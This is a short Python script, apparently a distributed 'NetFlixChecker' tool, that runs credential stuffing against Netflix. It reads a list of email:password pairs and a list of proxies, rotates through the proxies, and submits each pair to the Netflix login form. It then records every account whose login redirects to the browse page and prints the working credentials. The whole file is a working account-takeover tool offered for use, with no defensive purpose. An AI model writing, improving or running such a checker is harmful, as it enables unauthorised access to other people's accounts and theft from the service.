from tkinter import filedialog
import mechanize,time,os,sys

os.system('cls')

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]


def main():
    os.system('cls')
    print('NetFlixChecker  ---  Chara98',end="\n\n")
    prox = 0
    Acc = 0
    AccWorkingList = list()

    files = filedialog.askopenfile(mode='r', title='Load Email:Password',filetype=((".txt","*.txt"),("All files","*.txt")))
    proxy = filedialog.askopenfile(mode='r', title='Load Ip:Port',filetype=((".txt","*.txt"),("All files","*.txt")))
    for line,proxi in zip(files,proxy):
        proxi=proxi.replace('\n','')
        try:
            try:
                prox+=1
                br.set_proxies({'http':proxi,'https':proxi})
            except:
                prox-=1
                pass

            #Make request to Netflix
            br.open('https://www.netflix.com/in/login')
            
            #Split the Email:Pass
            line = line.split(":")

            #Select the from and input the creds and then submit
            br.select_form(nr=0)
            br.form['userLoginId'] = line[0]
            br.form['password'] = line[1]
            res = br.submit()

            #Checking...
            if res.geturl() == 'https://www.netflix.com/browse':
                print(f'[+] Working: {Acc}    proxy: {prox}')
                br.open('https://www.netflix.com/SignOut?lnkctr=mL')
                AccWorkingList.append(line[0]+':'+line[1])
            
            else:
                Acc+=1
                print(f'[-] Not Working: {Acc}    proxy: {prox}')
        except:
            print('Something went wrong...')
            print('You can contact the maker Discord-Chara98#9898')
            time.sleep(1)
            sys.exit()
    #Print the working account
    for i in AccWorkingList:
        print(i)

print('NetFlixChecker  ---  Chara98')
print('1.Run Checker')
print('2.Install modules')
user = str(input('--> '))
if user == '1':
    main()
elif user == '2':
    os.system('pip install mechanize')
    os.system('pip3 install mechanize')
    print()
    print('Install Complete')
    print('Run the program now')
